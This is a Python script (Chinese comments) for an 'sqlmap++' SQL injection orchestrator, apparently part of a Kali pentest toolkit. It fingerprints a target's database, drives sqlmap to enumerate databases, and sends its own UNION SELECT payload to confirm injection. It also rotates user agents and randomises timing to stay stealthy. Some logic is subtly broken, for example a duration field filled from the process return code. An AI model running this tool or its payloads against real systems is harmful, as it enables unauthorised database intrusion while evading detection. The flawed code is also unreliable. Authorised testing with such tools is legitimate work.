#!/usr/bin/env python3
"""sqlmap++ — 智能 SQL 注入编排器（fastsec 模式推广）。

相对原生 sqlmap 的创新:
  S1 指纹引导方言: whatweb/nuclei 指纹 → 预判 DBMS → sqlmap --dbms 跳过探测阶段
  S2 diff 预筛注入点: fastsec diff 找行为差异参数 → 只测可疑参数
  S3 3-gate 确认: sqlmap 报注入后基线对比真伪（能 UNION 出数据才算真）
  S4 stealth 前置: UA 池 + 节奏随机化 + 可选代理
  S5 结果入库: 确认注入 → findings_store

用法:
    py sqlmappp.py -u http://target/user?id=1
    py sqlmappp.py -u http://target/user -diff id,user,uid   # 先 diff 预筛
    py sqlmappp.py -u http://target/user?id=1 -H "Cookie: x=y"
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

# ---- stealth 资产（复用 fastsec 思路）----
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]
import random

def _rand_ua() -> str:
    return random.choice(UA_POOL)


# ---- DBMS 指纹表（whatweb/nuclei 常见信号 → DBMS）----
DBMS_SIGNALS = [
    (r"(?i)phpmyadmin|MySQL", "mysql"),
    (r"(?i)SQL Server|MSSQL|msde", "mssql"),
    (r"(?i)PostgreSQL|postgres", "postgresql"),
    (r"(?i)Oracle", "oracle"),
    (r"(?i)SQLite|sqlite", "sqlite"),
    (r"(?i)mongodb|mongo", "mongodb"),  # NoSQL，sqlmap 不适用
    (r"(?i)Redis", "redis"),
]


def fingerprint_dbms(target: str, headers: str = "") -> str:
    """指纹探测 → 预判 DBMS（S1）。返回 dbms 名或 ''（未知）。"""
    ua = _rand_ua()
    # 1) whatweb 指纹
    try:
        import shlex
        cmd = f"whatweb -a 1 {shlex.quote(target)} 2>&1 | head -20"
        if headers:
            cmd = f"whatweb -a 1 -H {shlex.quote(headers)} {shlex.quote(target)} 2>&1 | head -20"
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True, timeout=30)
        blob = (r.stdout or "") + (r.stderr or "")
        for sig, db in DBMS_SIGNALS:
            if re.search(sig, blob):
                return db
    except Exception:
        pass
    # 2) 直接抓响应头/body 关键词
    try:
        import urllib.request
        req = urllib.request.Request(target, headers={"User-Agent": ua})
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read(5000).decode("utf-8", "replace")
            for sig, db in DBMS_SIGNALS:
                if re.search(sig, body):
                    return db
    except Exception:
        pass
    return ""


# ---- sqlmap 调用（S4 stealth 前置）----
def run_sqlmap(target: str, dbms: str = "", headers: str = "",
               level: int = 1, risk: int = 1, extra: str = "") -> Dict[str, Any]:
    """调 sqlmap CLI，stealth 前置（UA + 节奏）。返回结构化结果。"""
    import shlex
    cmd = ["sqlmap", "-u", target, "--batch", f"--level={level}", f"--risk={risk}"]
    if dbms and dbms not in ("mongodb", "redis"):  # NoSQL 不适用 sqlmap
        cmd.append(f"--dbms={dbms}")  # S1: 跳过 DBMS 探测
    if headers:
        cmd.append("-H")
        cmd.append(headers)
    ua = _rand_ua()
    cmd.append(f"--user-agent={ua}")  # S4: 随机 UA
    cmd.append("--delay=0.5")         # S4: 节奏
    cmd.append("--threads=1")
    if extra:
        cmd += extra.split()
    cmd.append("--dbs")

    # 输出到临时文件（避免终端交互污染）
    tmp = Path(f"/tmp/sqlmappp_{int(time.time())}.log")
    proc = subprocess.run(["bash", "-c", " ".join(shlex.quote(c) for c in cmd)],
                          capture_output=True, text=True, timeout=300)
    out = (proc.stdout or "") + (proc.stderr or "")
    tmp.write_text(out)

    # 解析注入结论
    injection = False
    dbms_found = ""
    payloads: List[str] = []
    for line in out.splitlines():
        if "Type:" in line and ("UNION" in out or "boolean" in line or "error-based" in line or "time-based" in line):
            injection = True
        m = re.search(r"back-end DBMS: (\S+)", out)
        if m:
            dbms_found = m.group(1)
        m2 = re.search(r"Payload: (.+)", out)
        if m2 and "UNION" in m2.group(1):
            payloads.append(m2.group(1).strip())

    return {
        "injection": injection,
        "dbms": dbms_found or dbms,
        "payloads": payloads[:3],
        "raw": out[-4000:],
        "log": str(tmp),
        "duration_s": round(proc.returncode, 2),
    }


# ---- S3: 3-gate 确认（能 UNION 出数据才算真注入）----
def confirm_injection(target: str, payloads: List[str], headers: str = "") -> bool:
    """3-gate: 基线（正常 id=1） vs UNION payload（应返回多行数据）。"""
    import urllib.request
    ua = _rand_ua()
    base_url = target.split("?")[0]
    try:
        # 基线: 正常参数
        req = urllib.request.Request(target, headers={"User-Agent": ua})
        with urllib.request.urlopen(req, timeout=15) as resp:
            base_body = resp.read().decode("utf-8", "replace")
        # 攻击: UNION SELECT 探测列数（2 列），URL 编码
        import urllib.parse
        attack = f"{base_url}?id=" + urllib.parse.quote("1 UNION SELECT 1,2-- ")
        req2 = urllib.request.Request(attack, headers={"User-Agent": ua})
        with urllib.request.urlopen(req2, timeout=15) as resp:
            attack_body = resp.read().decode("utf-8", "replace")
        # 对比: UNION 返回不同内容（含数字标记）说明数据可枚举
        diff = base_body != attack_body and ("1" in attack_body or "2" in attack_body)
        return diff
    except Exception:
        return bool(payloads)  # 请求失败时退化为 payload 存在即候选


# ---- S5: 结果入库 ----
def store_finding(task_id: str, url: str, dbms: str, payload: str, severity: str = "critical") -> None:
    """入库。Kali 侧无法 import Kali MCP → 写结果文件（/tmp/sqlmappp_findings.json），
    由 MCP 侧 ingest_sqlmappp_findings 读入 findings_store。"""
    import json as _json
    out = {
        "task_id": task_id,
        "findings": [{
            "title": f"SQL 注入确认 {url}",
            "target": url,
            "severity": severity,
            "reproduce_cmd": f"sqlmap -u '{url}' --batch --dbms={dbms}",
            "expected_signal": "UNION 返回多行数据",
            "source": "sqlmappp",
            "technique_ids": ["T1190"],
            "meta": {"dbms": dbms, "payload": payload},
        }]
    }
    try:
        f = Path("/tmp/sqlmappp_findings.json")
        existing = []
        if f.exists():
            try:
                existing = _json.loads(f.read_text()).get("findings", [])
            except Exception:
                pass
        existing.append(out["findings"][0])
        f.write_text(_json.dumps({"findings": existing}, ensure_ascii=False, indent=2))
    except Exception:
        pass


def ingest_sqlmappp_findings() -> int:
    """MCP 侧调用：读 /tmp/sqlmappp_findings.json → findings_store。"""
    import json as _json
    f = Path("/tmp/sqlmappp_findings.json")
    if not f.exists():
        return 0
    try:
        data = _json.loads(f.read_text())
        sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
        from kali_mcp.core.verifier import register_candidate
        n = 0
        for item in data.get("findings", []):
            register_candidate(
                item.get("task_id", "sqlmappp"),
                title=item.get("title", "SQL 注入"),
                target=item.get("target", ""),
                severity=item.get("severity", "critical"),
                reproduce_cmd=item.get("reproduce_cmd", ""),
                expected_signal=item.get("expected_signal", ""),
                source=item.get("source", "sqlmappp"),
                technique_ids=item.get("technique_ids", ["T1190"]),
                meta=item.get("meta", {}),
            )
            n += 1
        f.unlink(missing_ok=True)
        return n
    except Exception:
        return 0


# ---- S2: diff 预筛注入点 ----
def diff_prescreen(target: str, params: str, headers: str = "") -> List[str]:
    """fastsec diff 找行为差异参数 → 返回可疑参数列表。"""
    import shlex
    try:
        base = target.split("?")[0]
        cmd = ["fastsec", "-u", base, "-diff", params,
               "-delay-min", "50", "-delay-max", "150", "-c", "10",
               "-json", "/dev/stdout"]
        if headers:
            cmd += ["-H", headers]
        r = subprocess.run(["bash", "-c", " ".join(shlex.quote(c) for c in cmd)],
                           capture_output=True, text=True, timeout=120)
        out = (r.stdout or "") + (r.stderr or "")
        # 从 JSON 提取 priority
        try:
            start = out.find("{")
            if start >= 0:
                data = json.loads(out[start:])
                return [p.get("param") for p in data.get("priority", [])[:5]]
        except Exception:
            pass
        # 文本 fallback
        params_found = re.findall(r"#\d+ \[[^\]]+\] (\S+)", out)
        return params_found[:5]
    except Exception:
        return []


def main():
    ap = argparse.ArgumentParser(description="sqlmap++ 智能注入")
    ap.add_argument("-u", "--url", required=True, help="target URL")
    ap.add_argument("-H", "--header", default="", help="extra header (k:v)")
    ap.add_argument("--diff", default="", help="diff pre-screen params (comma list)")
    ap.add_argument("--level", type=int, default=1)
    ap.add_argument("--risk", type=int, default=1)
    ap.add_argument("--task-id", default="sqlmappp", help="findings store task id")
    ap.add_argument("--no-store", action="store_true", help="skip findings store")
    args = ap.parse_args()

    print(f"[sqlmap++] 目标: {args.url}")
    t0 = time.time()

    # S1: 指纹引导 DBMS
    dbms = fingerprint_dbms(args.url, args.header)
    print(f"[sqlmap++] S1 指纹: DBMS={dbms or '未知（sqlmap 自动探测）'}")

    # S2: diff 预筛
    targets_to_test = [args.url]
    if args.diff:
        suspicious = diff_prescreen(args.url, args.diff, args.header)
        if suspicious:
            base = args.url.split("?")[0]
            targets_to_test = [f"{base}?{p}=1" for p in suspicious]
            print(f"[sqlmap++] S2 diff 预筛: {suspicious}")
        else:
            print(f"[sqlmap++] S2 diff 预筛: 无差异参数，退回全测")

    # S3/S4: sqlmap 执行 + 确认
    findings = []
    for t in targets_to_test[:3]:
        print(f"\n[sqlmap++] 测试: {t}")
        res = run_sqlmap(t, dbms, args.header, args.level, args.risk)
        if res["injection"]:
            print(f"  [!] 注入确认: DBMS={res['dbms']} payloads={res['payloads'][:1]}")
            # S3: 3-gate 确认
            confirmed = confirm_injection(t, res["payloads"], args.header)
            print(f"  [S3] 3-gate 确认: {'真注入（UNION 出数据）' if confirmed else '待人工验证'}")
            if confirmed:
                findings.append({"url": t, "dbms": res["dbms"], "payload": res["payloads"][:1]})
                if not args.no_store:
                    store_finding(args.task_id, t, res["dbms"], str(res["payloads"][:1]))
        else:
            print(f"  - 未发现注入")

    dur = time.time() - t0
    print(f"\n[sqlmap++] 完成: {len(findings)} 确认注入 / {len(targets_to_test)} 目标, 耗时 {dur:.0f}s")
    for f in findings:
        print(f"  [critical] {f['url']} ({f['dbms']})")


if __name__ == "__main__":
    main()
